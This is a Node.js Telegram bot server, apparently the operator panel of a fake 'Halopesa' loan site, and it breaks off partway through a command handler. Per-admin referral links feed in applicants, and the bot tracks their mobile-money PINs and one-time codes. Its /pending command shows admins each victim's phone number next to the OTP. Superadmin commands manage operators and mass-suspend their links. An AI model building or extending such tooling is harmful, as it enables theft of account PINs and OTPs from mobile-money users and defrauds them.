const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds      = new Map(); // adminId → chatId
const pausedAdmins      = new Set(); // adminIds that are paused
const processingLocks   = new Set(); // prevents duplicate pin submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    // Handle double prefix e.g. +2630712345678 → 0712345678
    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    // One row per admin: checkbox button
    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    // Navigation row
    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    // Action row
    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS (set up immediately)
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        // Keep-alive + self-ping to prevent Render free tier sleep
        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000); // every 14 minutes

        // Webhook health check + auto-fix
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            console.log(`\n   Processing: ${admin.name} (${admin.adminId}) chatId=${admin.chatId} status=${admin.status}`);
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
                console.log(`   ✅ LOADED`);
            } else {
                console.log(`   ⚠️ SKIPPED - missing chatId`);
            }
        }

        console.log(`\n✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        console.log(`\n/start from chatId: ${chatId}, adminId: ${adminId || 'NONE'}`);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin       = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                if (isSuperAdmin) {
                    message += `
*Admin Management (Super Admin Only):*
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins
/suspendall - 🔒 Suspend selected admin links (checklist)

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request
`;
                }
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to Halopesa Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin      = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin.createdAt).toLocaleString()}
${statusEmoji} Status: ${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin (help message)
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Use this format:

\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin John Doe|john@example.com|123456789\`

*How to get Chat ID:*
1. Ask the new admin to start your bot
2. They will receive their Chat ID
3. Use that Chat ID here
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const allAdmins        = await db.getAllAdmins();
            const existingNumbers  = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber       = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId       = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Their link:
${WEBHOOK_URL}?admin=${newAdminId}

✅ Admin is now CONNECTED and ready!
            `, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information

✅ You're connected and ready!
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    // /addadminid ADMINID|NAME|EMAIL|CHATID
    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) {
                return bot.sendMessage(chatId, `
❌ *Invalid format*

Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`

*Example:*
\`/addadminid ADMIN024|John Doe|john@example.com|123456789\`
                `, { parse_mode: 'Markdown' });
            }

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED WITH CUSTOM ID*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Their link:
${WEBHOOK_URL}?admin=${newAdminId}
            `, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

/mylink /stats /pending /myinfo
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin with custom ID:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /transferadmin oldChatId | newChatId
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) {
                return bot.sendMessage(chatId, `
❌ *Invalid Format*

Use: /transferadmin oldChatId | newChatId
                `, { parse_mode: 'Markdown' });
            }

            const [oldChatIdStr, newChatIdStr] = parts;
            const oldChatId = parseInt(oldChatIdStr);
            const newChatId = parseInt(newChatIdStr);
            if (isNaN(oldChatId) || isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!');

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot transfer the super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found in database!');

            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `
🔄 *ADMIN TRANSFERRED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
Old Chat ID: \`${oldChatId}\`
New Chat ID: \`${newChatId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*\n\nContact super admin if this was not you.`, { parse_mode: 'Markdown' }).catch(() => {});
            bot.sendMessage(newChatId, `
🎉 *ADMIN ACCESS TRANSFERRED TO YOU*

Welcome ${admin.name}!
*Your Admin ID:* \`${targetAdminId}\`
*Your Link:* ${WEBHOOK_URL}?admin=${targetAdminId}

Use /start to see commands.
            `, { parse_mode: 'Markdown' }).catch(() => {
                bot.sendMessage(chatId, `⚠️ Could not notify new Chat ID (they may need to /start first)`);
            });
        } catch (error) {
            console.error('❌ Error transferring admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /pauseadmin <adminId>
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot pause the super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is already paused.`);

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            await bot.sendMessage(chatId, `
🚫 *ADMIN PAUSED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}

Use /unpauseadmin ${targetAdminId} to restore.
            `, { parse_mode: 'Markdown' });

            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact super admin for more information.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error pausing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /unpauseadmin <adminId>
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (!pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is not paused.`);

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            await bot.sendMessage(chatId, `
✅ *ADMIN UNPAUSED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error unpausing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /removeadmin <adminId>
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot remove the super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);

            await bot.sendMessage(chatId, `
🗑️ *ADMIN REMOVED*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            if (admin.chatId) {
                bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*\n\nContact super admin if you have questions.`, { parse_mode: 'Markdown' }).catch(() => {});
            }
        } catch (error) {
            console.error('❌ Error removing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        try {
            const allAdmins = await db.getAllAdmins();
            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdmin  = admin.adminId === 'ADMIN001';
                const isPaused      = pausedAdmins.has(admin.adminId);
                const isConnected   = adminChatIds.has(admin.adminId);
                const statusEmoji   = isSuperAdmin ? '⭐' : isPaused ? '🚫' : '✅';
                const statusText    = isSuperAdmin ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
                const connEmoji     = isConnected ? '🟢' : '⚪';

                message += `${index+1}. ${statusEmoji} *${admin.name}*\n`;
                message += `   📧 ${admin.email}\n`;
                message += `   🆔 \`${admin.adminId}\`\n`;
                message += `   ${connEmoji} ${statusText}\n`;
                if (admin.chatId) message += `   💬 \`${admin.chatId}\`\n`;
                message += '\n';
            });

            message += '\n🟢 = Connected | ⚪ = Not Connected';
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    // ==========================================
    // /suspendall - NEW: interactive checklist
    // All admins selected (✅) by default.
    // Tap to deselect (⬜) those you want to keep.
    // Paginated 10 per page, selections persist across pages.
    // ==========================================
    bot.onText(/\/suspendall/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can suspend links.');

        try {
            const allAdmins     = await db.getAllAdmins();
            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

            if (regularAdmins.length === 0) {
                return bot.sendMessage(chatId, '⚠️ No admins to suspend.');
            }

            // Build session: everyone selected for suspension by default
            const selections = new Set(regularAdmins.map(a => a.adminId));
            suspendAllSessions.set(chatId, {
                page: 0,
                allAdmins: regularAdmins,
                selections
            });

            const session = suspendAllSessions.get(chatId);
            const { text, inline_keyboard } = buildSuspendAllPage(session);

            await bot.sendMessage(chatId, text, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard }
            });

        } catch (error) {
            console.error('❌ Error in /suspendall:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /send <adminId> <message>
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can send messages to admins.');

        try {
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) {
                return bot.sendMessage(chatId, `❌ Use: /send ADMINID Your message here`, { parse_mode: 'Markdown' });
            }
            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText   = input.substring(spaceIndex + 1).trim();

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);

            const sent = await sendToAdmin(targetAdminId, `
📨 *MESSAGE FROM SUPER ADMIN*

${messageText}

---
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            if (sent) {
                bot.sendMessage(chatId, `✅ Message sent to ${targetAdmin.name} (\`${targetAdminId}\`)`, { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, `❌ Failed to send message to ${targetAdmin.name}`);
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /broadcast <message>
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');

        try {
            const messageText  = match[1].trim();
            const allAdmins    = await db.getAllAdmins();
            const targetAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');
            if (targetAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No other admins to broadcast to.');

            let successCount = 0, failCount = 0;
            const results = [];

            for (const admin of targetAdmins) {
                if (adminChatIds.has(admin.adminId)) {
                    const sent = await sendToAdmin(admin.adminId, `
📢 *BROADCAST FROM SUPER ADMIN*

${messageText}

---
⏰ ${new Date().toLocaleString()}
                    `, { parse_mode: 'Markdown' });
                    if (sent) { successCount++; results.push(`✅ ${admin.name}`); }
                    else       { failCount++;   results.push(`❌ ${admin.name} (send failed)`); }
                } else {
                    failCount++;
                    results.push(`⚪ ${admin.name} (not connected)`);
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            bot.sendMessage(chatId, `
📢 *BROADCAST COMPLETE*

✅ Sent: ${successCount}
❌ Failed: ${failCount}
Total: ${targetAdmins.length}

*Details:*
${results.join('\n')}
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /ask <adminId> <request>
    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can send action requests.');

        try {
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) {
                return bot.sendMessage(chatId, `❌ Use: /ask ADMINID Your request here`);
            }
            const targetAdminId = input.substring(0, spaceIndex).trim();
